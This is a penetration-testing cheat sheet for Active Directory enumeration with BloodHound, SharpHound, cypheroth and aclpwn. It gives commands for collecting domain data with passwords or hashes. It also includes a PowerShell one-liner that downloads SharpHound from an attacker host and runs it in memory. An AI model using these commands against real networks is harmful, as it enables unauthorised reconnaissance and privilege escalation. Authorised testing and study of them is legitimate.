# bloodhound

% bloodhound, Active directory enumeration

## bloodhound - Download BloodHound CLI
#plateform/linux #target/local #cat/RECON
https://github.com/SpecterOps/BloodHound
Passowrd Can be reset with ./bloodhound-cli resetpwd
```bash
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install
```

## bloodhound update
#plateform/linux #target/local #cat/RECON
https://github.com/SpecterOps/BloodHound

```bash

bloodhound-cli update
```

## bloodhound start
#plateform/linux #target/local #cat/RECON
https://github.com/SpecterOps/BloodHound

```bash

bloodhound-cli containers  start
```

## bloodhound stop
#plateform/linux #target/local #cat/RECON
https://github.com/SpecterOps/BloodHound

```bash

bloodhound-cli containers  stop
```

## bloodhound - collect data
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://gitlab.com/kalilinux/packages/bloodhound-ce-python

```bash

bloodhound-ce-python -d <domain> -u <user> -p <password> -c all -dc <dc-ip> -ns <nameserver> --zip
```

## bloodhound - collect data auth with hashe
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://gitlab.com/kalilinux/packages/bloodhound-ce-python

```bash

bloodhound-ce-python -d <domain> -u <user> --hashes <hash> -c all -dc <dc-ip> -ns <nameserver> --zip
```

## bloodhound - collect data (alternative)
#plateform/linux #target/remote #port/389 #port/631 #cat/RECON
https://gitlab.com/kalilinux/packages/bloodhound-ce-python

```bash

bloodhound-ce-python -d <domain> -u <user> -p <password> -gc <global_catalog> -dc <domain_controler> -c all --zip
```

## sharphound - collect bloodhound data
#plateform/windows #target/remote #port/389 #port/631 #cat/RECON
https://github.com/SpecterOps/SharpHound

```powershell

import-module sharphound.ps1
invoke-bloodhound -collectionmethod all -domain <domain>
```

## sharphound - collect bloodhound data download and execute
#plateform/windows #target/remote #port/389 #port/631 #cat/RECON
https://github.com/SpecterOps/SharpHound

```powershell

(new-object system.net.webclient).downloadstring('http://<lhost>/SharpHound.ps1') | Invoke-BloodHound -CollectionMethod All  -domain <domain>
```

## cypheroth - start
#plateform/linux #target/local #cat/RECON 
Toolset that runs cypher queries against Bloodhound's Neo4j backend and saves output to spreadsheets.

https://github.com/seajaysec/cypheroth

```bash

cypheroth -u <bh_user|neo4j> -p <bh_password|exegol4thewin> -d <domain>
```

## aclpwn - from computer to domain - dry run
#plateform/linux #target/local #cat/RECON 
Aclpwn.py is a tool that interacts with BloodHound to identify and exploit ACL based privilege escalation paths.

https://github.com/fox-it/aclpwn.py

```bash

aclpwn -f <computer_name> -ft computer -d <domain> -dry
```



